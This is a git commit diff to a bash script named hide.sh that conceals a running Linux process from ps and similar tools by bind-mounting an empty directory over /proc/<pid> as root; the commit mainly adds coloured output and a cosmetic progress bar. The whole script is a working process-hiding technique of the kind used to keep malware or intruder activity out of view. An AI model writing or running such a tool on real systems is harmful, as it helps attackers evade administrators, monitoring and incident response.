8a6b2cd188495624ceaeb0a18358fed61037dfa4
LV6 <63260147+LV6LV@users.noreply.github.com>
2022-09-09 00:06:32 -0500

    Update hide.sh

--- scripts/hide.sh
+++ scripts/hide.sh
@@ -1,51 +1,99 @@
 #!/usr/bin/env bash
-# A simple script to hide a process
-# Created by @MatheuzSecurity
-# https://twitter.com/inferigang
+: << 'COMMENT' 
+A simple script to hide a process
+Created by @MatheuzSecurity
+https://twitter.com/inferigang
+Now with color!
 
+COMMENT
+
+# Colors Defined
+RED=`tput bold && tput setaf 1`
+GREEN=`tput bold && tput setaf 2`
+YELLOW=`tput bold && tput setaf 3`
+BLUE=`tput bold && tput setaf 4`
+NORM=`tput sgr0`
+
+# Aux Functions
+function RED(){
+	printf "\n${RED}${1}${NORM}"
+}
+function GREEN(){
+	printf "\n${GREEN}${1}${NORM}"
+}
+function YELLOW(){
+	printf "\n${YELLOW}${1}${NORM}"
+}
+function BLUE(){
+	printf "\n${BLUE}${1}${NORM}"
+}
+function ProgressBar {
+# Process data
+	let _progress=(${1}*100/${2}*100)/100
+	let _done=(${_progress}*4)/10
+	let _left=40-$_done
+# Build progressbar string lengths
+	_done=$(printf "%${_done}s")
+	_left=$(printf "%${_left}s")
+
+# 1.2 Build progressbar strings and print the ProgressBar line
+# 1.2.1 Output example:
+# 1.2.1.1 Progress : [########################################] 100%
+printf "\r${YELLOW}Thinking(not really): ${NORM}[${_done// /#}${_left// /-}] ${_progress}%%"
+
+}
+
+# Variables
+_start=1
+
+# This accounts as the "totalState" variable for the ProgressBar function
+_end=100
+
+# Main Functions
 function mkFolder() {
         rm -rf /tmp/hidden
         mkdir /tmp/hidden
         if [[ $? -ne 0 ]]; then
-                echo "[err] An error has ocurred" >&2
+                RED "[err] An error has ocurred/n/n" >&2
                 exit 1
         fi
 }
-
 function hideProcess() {
         mount --bind /tmp/hidden /proc/$pid
 }
-
 function listProcess() {
-        ps -ef -o ppid,pid,tty,comm | grep ${process}
+        ps -efa -o ppid,pid,tty,comm ; printf "\n"
+}
+function filteredList(){
+	ps -efa -o ppid,pid,tty,comm | grep ${process} ; printf "\n"
 }
 
 if [[ $(id -u) -ne "0" ]]; then
-        echo "[error] You must run this script as root" >&2
+        RED "[error] You must run this script as root/n/n" >&2
         exit 1
 fi
 
-arr=('|' '/' '-' '\')
-
-for c in $(seq 1 5); do
-        for elt in ${arr[*]}; do
-                echo -ne "\r\033[<1>AInitializing $elt" && sleep 0.1;
-        done
+for number in $(seq ${_start} ${_end})
+do
+        sleep 0.01 # This changes the speed of the bar
+        ProgressBar ${number} ${_end}
 done
 
-echo -ne "\r"
-echo -ne "Lets get a list of processes. \r"
-read -p "Provide one of the following values (ppid,pid,tty,comm): " process
-echo -ne "\r"
+BLUE "\nLets get a list of processes. \n\n"
+listProcess
+printf "\r\n"
+read -p "Provide one of the following values to filter by (ppid,pid,tty,comm): " process
+filteredList
+printf "\r\n"
 read -p "Provide Process ID to hide: " pid
+
 
 mesg="Your PID was successfully hidden!"
 
-mkFolder && listProcess && hideProcess && \
-#mkFolder && hideProcess && \
+mkFolder && hideProcess && \
 
 for i in $(seq 1 ${#mesg}); do
-        echo -ne "${mesg:i-1:1}"
-        sleep 0.07
+        printf "${RED}${mesg:i-1:1}${NORM}"
+        sleep 0.02
 done
-echo -ne "\n"
+printf "\n"
